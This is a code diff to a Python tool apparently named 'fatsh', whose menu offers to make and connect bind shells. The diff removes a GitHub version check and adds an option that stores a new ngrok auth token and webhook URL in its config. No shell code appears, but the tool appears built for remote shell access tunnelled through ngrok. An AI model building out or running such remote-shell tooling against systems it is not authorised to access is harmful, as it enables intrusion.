@@ -45,18 +45,13 @@ with open(f"{current_dir}/config.json", "r") as cfgr:
         print("Rebooting...")
         sys.exit(0)
 
-# Versiyon kontrolü
-url = f"https://raw.githubusercontent.com/githur1234/fatsh/main/vs.txt?{int(time.time())}"
-response = requests.get(url)
-vs=response.text.strip()
-vss = shell.getvs().strip()
-if vs != vss:
-    print(Fore.GREEN + "[+] New version released for fatsh" + Fore.WHITE)
+
 
 # Menü
 print(Fore.BLUE + """
 [1] Make bind shell
 [2] Connect bind shell
+[3] Change shell config
 """ + Fore.WHITE)
 
 ch = input(Fore.RED + "fatsh" + Fore.YELLOW + f"@{os.getlogin()}>>" + Fore.WHITE)
@@ -96,3 +91,15 @@ elif ch == "2":
             break
         except Exception as e:
             print(Fore.RED + f"[!] Hata: {e}" + Fore.WHITE)
+elif ch == "3":
+    print("New ngrok auth token:")
+    tk = input(Fore.RED + "fatsh" + Fore.YELLOW + f"@{os.getlogin()}>>" + Fore.WHITE)
+    print("New webhook url:")
+    url2 = input(Fore.RED + "fatsh" + Fore.YELLOW + f"@{os.getlogin()}>>" + Fore.WHITE)
+    with open(f"{current_dir}/config.json", "r") as cfgr:
+        cfg=json.load(cfgr)
+        cfg["ngrok"]=tk
+        cfg["webhook"]=url2
+        with open(f"{current_dir}/config.json", "w") as cfgr:
+            json.dump(cfg, cfgr, indent=2)
+            print("The operation is successful")
